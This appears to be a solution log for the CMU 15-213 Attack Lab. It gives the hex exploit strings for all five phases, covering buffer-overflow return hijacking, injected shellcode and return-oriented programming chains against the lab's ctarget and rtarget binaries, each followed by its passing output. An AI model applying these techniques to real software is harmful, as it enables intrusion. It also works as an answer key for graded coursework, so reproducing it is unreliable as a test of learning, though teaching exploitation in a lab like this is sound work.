### Phase 1

```bash
$ ./hex2raw < phase1.txt > exploit-raw.txt && ./ctarget -q -i exploit-raw.txt
```

```
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 00 01 02 03 04 05 06 07 C0 17 40 00 00 00 00 00
```

### Phase 2

```bash
$ ./hex2raw < phase2.txt > exploit-raw.txt && ./ctarget -q -i exploit-raw.txt
```

```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 00 01 02 03 04 05 06 07 A8 DC 61 55 00 00 00 00 48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3
```

### Phase 3

```bash
$ ./hex2raw < phase3.txt > exploit-raw.txt && ./ctarget -q -i exploit-raw.txt
```

```
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 00 01 02 03 04 05 06 07 B1 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3
```

### Phase 4

```bash
$ ./hex2raw < phase4.txt > exploit-raw.txt && ./rtarget -q -i exploit-raw.txt
```

```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 00 01 02 03 04 05 06 07 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

### Phase 5

```bash
$ ./hex2raw < phase5.txt > exploit-raw.txt && ./rtarget -q -i exploit-raw.txt
```

```
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 00 01 02 03 04 05 06 07 AB 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```
